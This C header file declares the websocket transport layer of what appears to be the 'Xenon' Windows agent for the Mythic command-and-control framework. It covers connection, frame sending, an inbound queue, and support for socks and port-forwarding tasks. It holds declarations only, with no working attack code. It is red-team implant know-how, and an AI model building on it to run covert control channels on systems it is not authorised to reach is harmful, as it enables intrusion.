#pragma once
#include <windows.h>

#include "Xenon.h"
#include "Config.h"
#include "Package.h"

/* Mythic websocket C2 profile (Push only) */
#ifdef WEBSOCKET_TRANSPORT

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")

/* Inbound Mythic message queued by the receive thread */
typedef struct _WS_INBOUND_NODE {
    PBYTE  Buffer;
    SIZE_T Length;
    struct _WS_INBOUND_NODE* Next;
} WS_INBOUND_NODE, *PWS_INBOUND_NODE;

/**
 * @brief Establish WinHTTP websocket connection with Accept-Type: Push
 *        and start the dedicated receive thread.
 */
BOOL WebsocketConnect(void);

/**
 * @brief Stop receive thread and close WinHTTP handles.
 */
VOID WebsocketClose(void);

/**
 * @brief Send a Mythic base64 blob as a JSON text frame (fire-and-forget).
 */
BOOL WebsocketSend(PPackage package);

/**
 * @brief Non-blocking dequeue of one inbound Mythic base64 blob.
 *        Caller owns *ppOutData (LocalAlloc) on success.
 */
BOOL WebsocketReceive(PBYTE* ppOutData, SIZE_T* pOutLen);

/**
 * @brief Wait until an inbound message is queued or timeout elapses.
 *        Pass INFINITE to block until Mythic pushes (true Push idle).
 */
DWORD WebsocketWaitInbound(DWORD dwMilliseconds);

/**
 * @brief Whether the websocket is currently connected.
 */
BOOL WebsocketIsConnected(void);

/**
 * @brief Whether local work (socks/rportfwd/downloads) needs TaskRoutine ticks.
 */
BOOL WebsocketNeedsLocalPump(void);

#endif // WEBSOCKET_TRANSPORT
